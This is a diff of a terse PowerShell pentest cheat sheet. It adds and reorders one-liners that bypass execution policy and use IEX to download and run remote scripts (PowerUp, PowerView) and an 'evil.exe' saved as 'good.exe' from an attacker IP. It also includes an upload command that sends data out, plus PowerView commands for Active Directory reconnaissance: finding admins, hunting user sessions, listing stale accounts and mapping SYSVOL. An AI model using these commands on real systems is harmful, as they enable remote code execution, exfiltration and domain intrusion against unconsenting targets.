@@ -1,6 +1,16 @@
 PowerShell - How To
 
 
+# Download a file
+powershell -nop -exec bypass "IEX (New-Object Net.Webclient).DownloadFile('http://10.10.215.21/evil.exe', 'good.exe')"
+
+# Upload a file
+powershell -nop -exec bypass "IEX (New-Object Net.Webclient).UploadString('http://10.10.215.21/evil.ps1',"<PostDATA>")"
+
+# Execute a remote file
+powershell -nop -exec bypass "IEX (New-Object Net.WebClient).DownloadString('http://10.10.215.21:8000/PowerUp.ps1'); Invoke-AllChecks"
+------------------------------------------------------------------------------------------------------
+
 # Priv escalation
 
 - Load from disk
@@ -32,10 +42,6 @@ python -m SimpleHTTPServer
 
 - Windows
 powershell -nop -exec bypass "IEX (New-Object Net.WebClient).DownloadString('http://10.10.215.21:8000/PowerView.ps1'); Invoke-Netview"
-??? need to test
-============================
-
-Import-Module powerview.ps1
 Invoke-ShareFinder -CheckShareAccess
 
 New-PSDrive S -PSProvider FileSystem -Root \\10.0.0.14\SYSVOL
@@ -43,38 +49,21 @@ PSDrive
 Remove-PSDrive S
 ------------------------------------------------------------------------------------------------------
 
-# Download file
-IEX(New-Object System.Net.Webclient).DownloadString('http://10.0.0.10/evil.ps1')
-
-# Download file to disk
-IEX(New-Object System.Net.Webclient).DownloadFile('http://10.1.1.100/evil.exe', 'good.exe')
-
-# Upload file
-IEX(New-Object System.Net.Webclient).UploadString('http://10.0.0.10/evil.ps1',"<PostDATA>")
-------------------------------------------------------------------------------------------------------
-
 # Who are your admins
-
 Import-Module powerview.ps1
 Get-NetGroups *admin* | Get-NetGroup -Recurse
-------------------------------------------------------------------------------------------------------
 
 # Where are your admins
-
 Import-Module powerview.ps1
 Invoke-UserHunter -ShowAll
-------------------------------------------------------------------------------------------------------
-
-# Old user passwords
-
-Import-Module powerview.ps1
-Get-NetUser | ? {$_.whenchanged -lt (Get-Date).AddMonths(-12)} | % {$_.samaccountname}
-------------------------------------------------------------------------------------------------------
 
 # Who can admin your DC?
-
 Import-Module powerview.ps1
 Get-NetDomainControllers | Get-NetLocalGroup
+
+# Old user passwords
+Import-Module powerview.ps1
+Get-NetUser | ? {$_.whenchanged -lt (Get-Date).AddMonths(-12)} | % {$_.samaccountname}
 ------------------------------------------------------------------------------------------------------
 
 # Extract passwords from Group Policy
